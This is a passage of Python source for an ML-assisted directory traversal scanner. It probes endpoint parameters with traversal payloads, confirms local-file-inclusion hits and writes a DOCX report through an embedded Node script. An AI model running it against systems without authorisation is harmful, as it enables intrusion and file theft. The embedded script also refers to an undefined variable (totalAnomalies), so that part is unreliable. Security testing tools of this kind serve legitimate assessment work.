        for path in common_paths[:15]:
            url = base + path
            r = self.http.request("GET", url)
            if r.get("success") and r.get("status_code") in [200, 302, 301, 403]:
                for param in VULN_PARAMS[:10]:
                    found.add((url, param, "GET"))
                self.stats["endpoints_discovered"] += 1

        for param in VULN_PARAMS:
            found.add((base_url, param, "GET"))
            found.add((base_url, param, "POST"))

        endpoints = list(found)
        console.print(f"[green]  Found {len(endpoints)} endpoint/parameter combinations[/green]")
        return endpoints

    def scan_endpoint(self, url: str, param: str, method: str, payload: str, category: str) -> dict:
        """Test a single endpoint + param + payload combination"""
        baseline_value = "test123"

        if method == "GET":
            sep = "&" if "?" in url else "?"
            baseline_url = f"{url}{sep}{param}={quote(baseline_value)}"
            baseline = self.http.request("GET", baseline_url)
        else:
            baseline = self.http.request("POST", url, data={param: baseline_value})

        if method == "GET":
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={quote(payload)}"
            result = self.http.request("GET", test_url)
        else:
            result = self.http.request("POST", url, data={param: payload})

        analysis = self.analyzer.analyze_response(
            result, payload, param,
            baseline_body=baseline.get("response_body", "") if baseline else None,
        )
        analysis.update({
            "url": url,
            "method": method,
            "payload_category": category,
            "cvss": self.analyzer.cvss_score(analysis),
        })

        ml_input = {**result, "payload": payload, "parameter": param}
        ml_pred = self.ml.predict(ml_input)
        analysis["ml_prediction"] = ml_pred
        analysis["ml_flagged"] = ml_pred["is_vulnerable"] and not analysis.get("confirmed", False)

        label = 1 if analysis.get("confirmed", False) else 0
        with self.ml._lock:
            self.scan_data.append((self.ml.extract_features(ml_input), label))
            self.stats["requests_made"] += 1

        return analysis

    def run(self, targets: list) -> dict:
        """Main scan execution"""
        self.start_time = datetime.now()
        console.print(BANNER)
        self._init_models()

        console.print(Panel(
            f"[bold]Targets:[/bold] {', '.join(targets)}\n"
            f"[bold]Payload categories:[/bold] {', '.join(TRAVERSAL_PAYLOADS.keys())}\n"
            f"[bold]Total payloads:[/bold] {sum(len(v) for v in TRAVERSAL_PAYLOADS.values())}\n"
            f"[bold]Vulnerable params:[/bold] {len(VULN_PARAMS)}",
            title="[bold cyan]SCAN CONFIGURATION[/bold cyan]",
            expand=False
        ))

        all_findings = []

        for target in targets:
            console.print(f"\n[bold cyan]━━━ TARGET: {target} ━━━[/bold cyan]")

            console.print("[dim]  ● Fingerprinting server...[/dim]")
            fp = self.http.fingerprint(target)
            console.print(f"  Server: [yellow]{fp.get('server', '?')}[/yellow]  "
                          f"Tech: [yellow]{', '.join(fp.get('tech_stack', []))}[/yellow]  "
                          f"WAF: [red]{', '.join(fp.get('waf_detected', [])) or 'None detected'}[/red]")

            endpoints = self.discover_endpoints(target)

            tasks = []
            for url, param, method in endpoints:
                for cat, payloads in TRAVERSAL_PAYLOADS.items():
                    for payload in payloads[:5]:
                        tasks.append((url, param, method, payload, cat))

            console.print(f"\n[cyan]  🚀 Launching {len(tasks)} tests across {len(endpoints)} endpoints...[/cyan]\n")

            target_findings = []
            confirmed_count = 0

            with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=40),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TextColumn("•"),
                    TextColumn("[red]Confirmed: {task.fields[confirmed]}"),
                    TimeElapsedColumn(),
                    console=console,
            ) as progress:
                task_id = progress.add_task("[cyan]Scanning...", total=len(tasks), confirmed=0)

                for url, param, method, payload, cat in tasks:
                    finding = self.scan_endpoint(url, param, method, payload, cat)
                    finding["target"] = target
                    finding["fingerprint"] = fp

                    # ONLY add if CONFIRMED (not just ML-flagged)
                    if finding.get("confirmed", False):
                        target_findings.append(finding)
                        confirmed_count += 1
                        self.stats[f"severity_{finding['severity'].lower()}"] += 1
                        progress.update(task_id, confirmed=confirmed_count)

                    progress.advance(task_id)

            seen = set()
            dedup = []
            for f in target_findings:
                key = (f["url"], f["parameter"], f["category"])
                if key not in seen:
                    seen.add(key)
                    dedup.append(f)

            all_findings.extend(dedup)

            if confirmed_count > 0:
                console.print(
                    f"\n  [bold red]⚠️ {target}:[/bold red] {len(dedup)} CONFIRMED LFI vulnerabilities found!")
            else:
                console.print(f"\n  [bold green]✅ {target}:[/bold green] No confirmed vulnerabilities found.")

        if len(self.scan_data) >= 50:
            console.print("\n[bold yellow]🔄 Retraining models with real scan data...[/bold yellow]")
            X_new = np.array([d[0] for d in self.scan_data])
            y_new = np.array([d[1] for d in self.scan_data])
            self.ml.train_models(X=X_new, y=y_new, verbose=True)

        self.findings = all_findings
        self.stats["total_findings"] = len(all_findings)
        self.stats["scan_duration_sec"] = (datetime.now() - self.start_time).seconds

        self._print_summary()
        return {"findings": all_findings, "stats": dict(self.stats)}

    def _print_summary(self):
        """Print scan summary table"""
        table = Table(title="[bold]SCAN SUMMARY[/bold]", box=box.DOUBLE_EDGE, show_header=True)
        table.add_column("Metric", style="cyan", no_wrap=True)
        table.add_column("Value", style="green", justify="right")

        table.add_row("Total Requests", str(self.stats["requests_made"]))
        table.add_row("Endpoints Tested", str(self.stats["endpoints_discovered"]))
        table.add_row("CONFIRMED Findings", f"[bold red]{self.stats['total_findings']}[/bold red]")
        table.add_row("Critical", f"[bold red]{self.stats['severity_critical']}[/bold red]")
        table.add_row("High", f"[red]{self.stats['severity_high']}[/red]")
        table.add_row("Medium", f"[yellow]{self.stats['severity_medium']}[/yellow]")
        table.add_row("Low", f"[dim]{self.stats['severity_low']}[/dim]")
        table.add_row("Scan Duration", f"{self.stats['scan_duration_sec']}s")

        console.print("\n")
        console.print(table)

        if self.stats['total_findings'] == 0:
            console.print("\n[bold green]🎉 No confirmed directory traversal vulnerabilities found![/bold green]")


# ─────────────────────────────────────────────────
#  REPORT GENERATOR - FIXED: Only shows confirmed findings
# ─────────────────────────────────────────────────

class ReportGenerator:
    """Generates professional DOCX security reports - CONFIRMED FINDINGS ONLY"""

    def generate(self, scan_results: dict, output_path: str = None) -> str:
        """Generate full professional DOCX report"""
        if output_path is None:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = str(REPORTS_DIR / f"DT_Scan_Report_{ts}.docx")

        # Filter to ONLY confirmed findings
        all_findings = scan_results.get("findings", [])
        confirmed_findings = [f for f in all_findings if f.get("confirmed", False)]

        stats = scan_results.get("stats", {})

        critical = [f for f in confirmed_findings if f.get("severity") == "Critical"]
        high = [f for f in confirmed_findings if f.get("severity") == "High"]
        medium = [f for f in confirmed_findings if f.get("severity") == "Medium"]
        low = [f for f in confirmed_findings if f.get("severity") == "Low"]

        js_data = {
            "output_path": output_path,
            "scan_date": datetime.now().strftime("%B %d, %Y %H:%M"),
            "findings": confirmed_findings[:50],
            "stats": stats,
            "severity_counts": {
                "critical": len(critical), "high": len(high),
                "medium": len(medium), "low": len(low),
            },
            "total_confirmed": len(confirmed_findings),
            "total_anomalies": len(all_findings) - len(confirmed_findings),
        }

        js_path = DATA_DIR / "report_data.json"
        with open(js_path, "w") as f:
            json.dump(js_data, f, indent=2, default=str)

        node_script = self._build_node_script()
        node_path = DATA_DIR / "gen_report.js"
        with open(node_path, "w", encoding="utf-8") as f:
            f.write(node_script)

        import subprocess
        result = subprocess.run(
            ["node", str(node_path)],
            capture_output=True, text=True, encoding="utf-8"
        )

        if result.stdout:
            for line in result.stdout.splitlines():
                if not line.startswith("REPORT_OK:"):
                    console.print(line)

        if result.returncode != 0:
            console.print(f"[red]Report generation error: {result.stderr}[/red]")
            return None

        console.print(f"\n[bold green]📄 Report generated: {output_path}[/bold green]")
        return output_path

    def _build_node_script(self) -> str:
        return r"""
const fs = require('fs');
const path = require('path');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, WidthType, ShadingType,
  VerticalAlign, PageNumber, PageBreak, LevelFormat, Header, Footer,
} = require('docx');

const rawData = JSON.parse(fs.readFileSync('data/report_data.json','utf8'));
const { output_path, scan_date, findings, stats, severity_counts, total_confirmed, total_anomalies } = rawData;

const COLORS = {
  critical: 'C0392B', high: 'E74C3C', medium: 'E67E22',
  low:      'F1C40F', info: '3498DB', header: '1A1A2E',
  subhdr:   '16213E', accent: '0F3460', white: 'FFFFFF',
  lightgray:'F8F9FA', border: 'DEE2E6',
};

const border = { style: BorderStyle.SINGLE, size: 1, color: COLORS.border };
const borders = { top: border, bottom: border, left: border, right: border };

function hdrCell(text, w, color='1A1A2E') {
  return new TableCell({
    borders, width: { size: w, type: WidthType.DXA },
    shading: { fill: color, type: ShadingType.CLEAR },
    margins: { top: 80, bottom: 80, left: 120, right: 120 },
    verticalAlign: VerticalAlign.CENTER,
    children: [new Paragraph({ alignment: AlignmentType.CENTER,
      children: [new TextRun({ text, bold: true, color: COLORS.white, size: 18, font: 'Arial' })] })],
  });
}

function dataCell(text, w, color='F8F9FA', bold=false, textColor='000000') {
  return new TableCell({
    borders, width: { size: w, type: WidthType.DXA },
    shading: { fill: color, type: ShadingType.CLEAR },
    margins: { top: 60, bottom: 60, left: 100, right: 100 },
    children: [new Paragraph({ children: [
      new TextRun({ text: String(text||''), bold, color: textColor, size: 18, font: 'Arial' })
    ]})],
  });
}

function severityColor(sev) {
  const m = { Critical: COLORS.critical, High: COLORS.high, Medium: COLORS.medium, Low: COLORS.low };
  return m[sev] || COLORS.info;
}

function cvssRating(c) {
  if (c >= 9.0) return 'Critical'; if (c >= 7.0) return 'High';
  if (c >= 4.0) return 'Medium';   if (c > 0)    return 'Low';
  return 'Info';
}

// ── COVER PAGE ──────────────────────────────────
const coverPage = [
  new Paragraph({ spacing: { before: 2880 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'DIRECTORY TRAVERSAL', bold: true, size: 52, font: 'Arial', color: COLORS.header })] }),
  new Paragraph({ alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'VULNERABILITY ASSESSMENT REPORT', bold: true, size: 36, font: 'Arial', color: COLORS.accent })] }),
  new Paragraph({ spacing: { before: 480 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: '⚡ ML-Powered Security Analysis', size: 24, font: 'Arial', color: '7F8C8D', italics: true })] }),
  new Paragraph({ spacing: { before: 720 },
    border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: COLORS.accent, space: 1 } },
    children: [] }),
  new Paragraph({ spacing: { before: 480 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: `Report Date: ${scan_date}`, size: 22, font: 'Arial', color: '555555' })] }),
  new Paragraph({ spacing: { before: 200 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: `Classification: CONFIDENTIAL`, bold: true, size: 22, font: 'Arial', color: COLORS.critical })] }),
  new Paragraph({ children: [new PageBreak()] }),
];

// ── EXECUTIVE SUMMARY ───────────────────────────
const totalFindings = total_confirmed || 0;
const riskLevel = severity_counts.critical > 0 ? 'CRITICAL' : severity_counts.high > 0 ? 'HIGH' : totalFindings > 0 ? 'MEDIUM' : 'NONE';
const riskColor = riskLevel === 'CRITICAL' ? COLORS.critical : riskLevel === 'HIGH' ? COLORS.high : riskLevel === 'MEDIUM' ? COLORS.medium : COLORS.info;

const execSummary = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '1. Executive Summary', font: 'Arial', bold: true, size: 32 })] }),
  new Paragraph({ spacing: { before: 200, after: 200 },
    children: [new TextRun({ text:
      `This report presents findings from an automated directory traversal vulnerability assessment ` +
      `conducted using ML-powered scanning technology. The scan identified ${totalFindings} confirmed ` +
      `vulnerabilities across the target infrastructure, with an overall risk rating of `, size: 22, font: 'Arial' }),
      new TextRun({ text: riskLevel, bold: true, color: riskColor, size: 22, font: 'Arial' }),
      new TextRun({ text: '.', size: 22, font: 'Arial' })
    ]}),
];

if (totalAnomalies > 0) {
  execSummary.push(new Paragraph({ spacing: { before: 100 }, children: [
    new TextRun({ text: `Note: ${totalAnomalies} ML anomalies were detected but NOT confirmed as vulnerabilities. `, size: 20, font: 'Arial', color: '666666' }),
  ]}));
}

const summaryTable = new Table({
  width: { size: 9360, type: WidthType.DXA },
  columnWidths: [2340, 2340, 2340, 2340],
  rows: [
    new TableRow({ children: [
      hdrCell('CRITICAL', 2340, COLORS.critical),
      hdrCell('HIGH', 2340, COLORS.high),
      hdrCell('MEDIUM', 2340, COLORS.medium),
      hdrCell('LOW', 2340, COLORS.low),
    ]}),
    new TableRow({ children: [
      dataCell(severity_counts.critical, 2340, 'FFF0F0', true, COLORS.critical),
      dataCell(severity_counts.high,     2340, 'FFF5F5', true, COLORS.high),
      dataCell(severity_counts.medium,   2340, 'FFFAF0', true, COLORS.medium),
      dataCell(severity_counts.low,      2340, 'FFFFF0', true, '7D6608'),
    ]}),
  ],
});

execSummary.push(summaryTable);
execSummary.push(new Paragraph({ spacing: { before: 400 },
  children: [new TextRun({ text: 'Scan Statistics', bold: true, size: 26, font: 'Arial' })] }));

const statsTable = new Table({
  width: { size: 9360, type: WidthType.DXA },
  columnWidths: [4680, 4680],
  rows: [
    new TableRow({ children: [ hdrCell('Metric', 4680), hdrCell('Value', 4680) ] }),
    ...Object.entries({
      'Total HTTP Requests':    stats.requests_made || 0,
      'Endpoints Discovered':   stats.endpoints_discovered || 0,
      'Scan Duration':          `${stats.scan_duration_sec || 0}s`,
      'ML Model':               'Ensemble (RF + GB + MLP + IsolationForest)',
      'Confirmed Findings':     totalFindings,
      'ML Anomalies (Unconfirmed)': totalAnomalies || 0,
    }).map(([k,v], i) => new TableRow({ children: [
      dataCell(k, 4680, i%2===0?'F8F9FA':'FFFFFF', true),
      dataCell(v, 4680, i%2===0?'F8F9FA':'FFFFFF'),
    ]})),
  ],
});

execSummary.push(statsTable);
execSummary.push(new Paragraph({ children: [new PageBreak()] }));

// ── ML ANALYSIS SECTION ─────────────────────────
const mlSection = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '2. ML-Assisted Analysis', bold: true, size: 32, font: 'Arial' })] }),
  new Paragraph({ spacing: { before: 200, after: 200 },
    children: [new TextRun({ text:
      'The scanner employs an ensemble of four machine learning models: Isolation Forest for anomaly ' +
      'detection, Random Forest Classifier, Gradient Boosting Classifier, and a Multi-Layer Perceptron ' +
      'neural network. Models are trained on synthetic data and then retrained in-session using real ' +
      'scan results, continuously improving detection accuracy.\n\n' +
      '⚠️ IMPORTANT: ML anomalies are NOT reported as vulnerabilities unless confirmed by actual ' +
      'file content or LFI-specific error messages. This eliminates false positives.',
      size: 22, font: 'Arial' })] }),
  new Paragraph({ spacing: { before: 200 },
    children: [new TextRun({ text: 'Model Ensemble Architecture:', bold: true, size: 22, font: 'Arial' })] }),
  ...['Isolation Forest — Anomaly detection for unusual response patterns',
      'Random Forest (200 trees) — Supervised classification of traversal success',
      'Gradient Boosting (150 estimators) — Boosted ensemble for high-precision detection',
      'MLP Neural Network (128→64→32) — Deep pattern recognition in feature space',
  ].map(t => new Paragraph({ spacing: { before: 80 },
    numbering: { reference: 'bullets', level: 0 },
    children: [new TextRun({ text: t, size: 20, font: 'Arial' })] })),
  new Paragraph({ children: [new PageBreak()] }),
];

// ── DETAILED FINDINGS ───────────────────────────
const findingSection = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '3. Detailed Findings', bold: true, size: 32, font: 'Arial' })] }),
];

if (findings.length === 0) {
  findingSection.push(
    new Paragraph({ spacing: { before: 200 }, children: [
      new TextRun({ text: '✅ No confirmed vulnerabilities found during this scan.', size: 22, font: 'Arial', color: '27AE60' })
    ]}),
    new Paragraph({ spacing: { before: 100 }, children: [
      new TextRun({ text: 'The scanner identified no directory traversal vulnerabilities that could be confirmed with actual file content or LFI-specific error messages.', size: 20, font: 'Arial', color: '666666' })
    ]})
  );
} else {
  findings.forEach((f, idx) => {
    const sev      = f.severity || 'Info';
    const sevColor = severityColor(sev);
    const mlConf   = f.ml_prediction ? `${(f.ml_prediction.confidence * 100).toFixed(1)}%` : 'N/A';
    const cvss     = typeof f.cvss === 'number' ? f.cvss.toFixed(1) : '0.0';
    const evidence = (f.evidence||[]).map(e=>e.indicator).join(', ') || 'Confirmed LFI';
    const confirmedBadge = f.confirmed ? '✅ CONFIRMED' : '⚠️ UNCONFIRMED';

    findingSection.push(
      new Paragraph({ spacing: { before: 400 }, heading: HeadingLevel.HEADING_2,
        children: [new TextRun({ text: `Finding #${idx+1}: ${sev} – ${f.category||'Unknown'}`,
        """